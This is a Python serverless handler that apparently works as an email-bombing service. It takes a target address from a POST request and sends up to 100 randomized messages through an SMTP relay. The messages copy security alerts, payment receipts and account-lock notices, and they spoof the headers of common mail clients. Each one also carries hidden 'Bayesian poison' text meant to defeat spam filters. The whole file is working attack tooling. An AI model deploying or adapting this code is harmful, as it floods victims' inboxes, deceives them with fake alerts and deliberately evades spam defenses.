from http.server import BaseHTTPRequestHandler
import json
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate, make_msgid
import os
import random
import string
import time

# ── DYNAMIC HTML PAYLOAD GENERATOR ──
def gen_payload(target_email, sender_email):
    msg = MIMEMultipart('alternative')
    
    sender_names = ["Support", "Security Team", "Alerts", "Admin", "Billing", "Customer Care", "No Reply", "System"]
    subjects = [
        f"Action Required: Alert #{random.randint(1000,9999)}",
        "Your recent sign-in",
        f"Receipt for Order {random.choice(string.ascii_uppercase)}{random.randint(10000,99999)}",
        "Security Notice",
        "Verify your device",
        "Unusual activity detected",
        "Your subscription update",
        "Payment Processed",
        "Delivery Exception Notice",
        "Account Locked - Action Required"
    ]
    
    display_name = random.choice(sender_names)
    msg['From'] = f"{display_name} <{sender_email}>"
    msg['To'] = target_email
    msg['Subject'] = random.choice(subjects)
    msg['Date'] = formatdate(localtime=True)
    msg['Message-ID'] = make_msgid(domain="reaper-ops.local")
    
    msg['X-Priority'] = str(random.randint(1, 5))
    msg['X-Mailer'] = random.choice(["Microsoft Outlook 16.0", "Apple Mail (2.3654.120.0.1.13)", "Thunderbird 78.14.0", "YahooMailProxy/3.2"])
    
    # Bayesian poison (invisible text to break spam filters)
    poison = ''.join(random.choices(string.ascii_letters + " ", k=random.randint(150, 400)))
    code = ''.join(random.choices(string.digits, k=6))
    amount = f"{random.randint(10, 999)}.{random.randint(10, 99)}"
    
    html_templates = [
        f"""
        <html><body style="font-family: Arial, sans-serif; color: #333; padding: 20px;">
        <div style="max-width: 600px; margin: 0 auto; border: 1px solid #eee; padding: 20px; border-radius: 5px;">
        <h2 style="color: #d9534f;">Security Alert</h2>
        <p>We detected an unusual sign-in attempt on your account.</p>
        <p>If this was you, please use the following verification code to authorize the device:</p>
        <h1 style="background: #f5f5f5; padding: 15px; text-align: center; letter-spacing: 5px;">{code}</h1>
        <p style="font-size: 12px; color: #888;">If you did not request this, please secure your account immediately.</p>
        <div style="display:none; opacity:0;">{poison}</div>
        </div></body></html>
        """,
        f"""
        <html><body style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f9f9f9; padding: 30px;">
        <div style="background: white; padding: 30px; border-radius: 8px; max-width: 500px; margin: 0 auto; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
        <h2 style="margin-top: 0;">Payment Receipt</h2>
        <p>Thank you for your recent purchase. Your payment has been processed successfully.</p>
        <table style="width: 100%; border-top: 1px solid #ddd; border-bottom: 1px solid #ddd; margin: 20px 0; padding: 10px 0;">
        <tr><td><strong>Total Billed:</strong></td><td style="text-align: right;"><strong>${amount}</strong></td></tr>
        <tr><td>Transaction ID:</td><td style="text-align: right;">TXN-{random.randint(1000000,9999999)}</td></tr>
        </table>
        <p style="font-size: 12px; color: #777;">If you don't recognize this charge, use PIN {code} to dispute it.</p>
        <div style="display:none; color:white; font-size:1px;">{poison}</div>
        </div></body></html>
        """,
        f"""
        <html><body style="font-family: sans-serif; background: #eceff1; margin: 0; padding: 20px;">
        <div style="background: white; max-width: 400px; margin: 0 auto; padding: 20px; border-radius: 10px; text-align: center;">
        <div style="width: 50px; height: 50px; background: #007bff; color: white; border-radius: 50%; line-height: 50px; font-size: 24px; margin: 0 auto 15px;">&#128276;</div>
        <h3 style="margin: 0 0 10px;">New Notification</h3>
        <p style="color: #555;">You have <strong>{random.randint(2, 9)}</strong> unread messages waiting in your secure inbox.</p>
        <a href="#" style="display: inline-block; background: #007bff; color: white; text-decoration: none; padding: 10px 20px; border-radius: 5px; margin-top: 15px;">View Messages</a>
        <p style="font-size: 10px; color: #aaa; margin-top: 20px;">Ref: {code}</p>
        <div style="display:none; height:0px; overflow:hidden;">{poison}</div>
        </div></body></html>
        """
    ]
    
    text = f"Notification. Code: {code}. Amount: ${amount}. Ref: {poison[:20]}"
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(random.choice(html_templates), 'html')
    
    msg.attach(part1)
    msg.attach(part2)
    return msg

# ── STANDARD EMAIL FLOODER ──
def email_flood(target_email, count=25):
    smtp_host = os.environ.get('SMTP_HOST', 'smtp-relay.brevo.com')
    smtp_port = int(os.environ.get('SMTP_PORT', 587))
    smtp_user = os.environ.get('SMTP_USER')
    smtp_pass = os.environ.get('SMTP_PASS')
    sender = os.environ.get('SENDER_EMAIL', 'retriontop@gmail.com')

    if not all([smtp_user, smtp_pass, sender]):
        return {'status': 'failed', 'error': 'SMTP credentials not configured in Vercel ENV'}

    results = []
    total_sent = 0

    try:
        server = smtplib.SMTP(smtp_host, smtp_port, timeout=10)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(smtp_user, smtp_pass)

        for i in range(count):
            try:
                msg = gen_payload(target_email, sender)
                server.sendmail(sender, [target_email], msg.as_string())
                results.append({'seq': total_sent + 1, 'status': 'sent'})
                total_sent += 1
                time.sleep(random.uniform(0.05, 0.25))
            except Exception as e:
                results.append({'seq': total_sent + 1, 'status': 'failed', 'error': str(e)})
                total_sent += 1

        server.quit()
    except Exception as e:
        return {
            'status': 'partial',
            'error': f'SMTP error: {str(e)}',
            'messages_sent': sum(1 for r in results if r['status'] == 'sent'),
            'messages_total': total_sent,
            'results': results
        }

    sent_ok = sum(1 for r in results if r['status'] == 'sent')
    return {
        'status': 'complete',
        'target': target_email,
        'messages_sent': sent_ok,
        'messages_total': total_sent,
        'results': results
    }

class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            body = json.loads(post_data.decode('utf-8'))

            target = body.get('target')
            count = min(int(body.get('count', 25)), 100)  # cap at 100

            if not target or '@' not in target:
                self._json(400, {'error': 'Valid target email required'})
                return

            result = email_flood(target, count)
            self._json(200, result)

        except Exception as e:
            self._json(500, {'error': str(e)})

    def _json(self, code, data):
        self.send_response(code)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
